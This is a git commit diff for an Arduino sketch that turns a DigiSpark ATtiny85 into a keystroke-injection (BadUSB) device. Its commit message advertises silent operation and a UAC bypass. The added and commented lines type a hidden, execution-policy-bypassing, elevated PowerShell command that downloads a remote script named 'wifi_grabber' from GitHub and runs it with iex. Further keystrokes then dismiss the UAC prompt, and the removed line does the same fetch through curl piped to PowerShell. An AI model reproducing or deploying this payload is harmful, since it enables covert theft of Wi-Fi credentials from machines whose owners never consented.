a54dfca8905f56817ae9db37b7d35652234ddab6
Khagads <65121358+mikcamz@users.noreply.github.com>
2024-12-18 21:47:36 +0700

    Upgrade run.ino
    - Shorter commands
    - Run pretty much silent
    - Can ask for admin exec (even bypass UAC)

--- run.ino
+++ run.ino
@@ -1,32 +1,33 @@
 #include "DigiKeyboard.h"
-#define KEY_DOWN 0x51 // Keyboard Down Arrow
-#define KEY_ENTER 0x28 //Return/Enter Key
-#define MOD_SHIFT_LEFT (1<<1)
-#define MOD_CONTROL_LEFT 1
 
 void setup() {
-  pinMode(1, OUTPUT); //LED on Model A 
+  pinMode(1, OUTPUT); //LED on Model A
 }
 
 void loop() {
   DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(3000);
-  
+
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(200);
-  DigiKeyboard.println("cmd /c curl -k https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|powershell>nul 2>&1"); 
-  // DigiKeyboard.println("cmd /k curl -k https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|powershell"); //for debugging
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_RIGHT + MOD_SHIFT_RIGHT); // haven't worked for SHIFT + CTRL to open admin cmd
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(0);
+//  DigiKeyboard.println("powershell -w h -c \"iwr https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|iex\""); //ultrashortcommand
+//  DigiKeyboard.println("powershell -windowstyle hidden -Command "& {Invoke-WebRequest -Uri https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber -UseBasicParsing | Invoke-Expression}""); //full command
+//  DigiKeyboard.println("powershell -command "& {Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber -UseBasicParsing | Invoke-Expression\"'}""); //for debugging
+  DigiKeyboard.println("powershell -c \"Start-Process powershell -ArgumentList '-NoP -Exec Bypass -w h -c \"iwr https://raw.githubusercontent.com/mikcamz/attiny85_curl/main/wifi_grabber|iex\"' -Verb RunAs\""); //shortened and PRIV
+  DigiKeyboard.sendKeyStroke(0, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT | MOD_ALT_LEFT);  // Ctrl + Shift + Enter
+  delay(2000);  // Wait for UAC to appear
+
+// Simulate pressing Left Arrow to focus on the "No" option in UAC
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(500);
+  delay(50);  // Short delay
+
+// Simulate pressing Enter to confirm the "No" selection
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  
+
   digitalWrite(1, HIGH); //turn on led when program finishes
   DigiKeyboard.delay(90000);
-  digitalWrite(1, LOW); 
+  digitalWrite(1, LOW);
   DigiKeyboard.delay(5000);
-  
+
 }
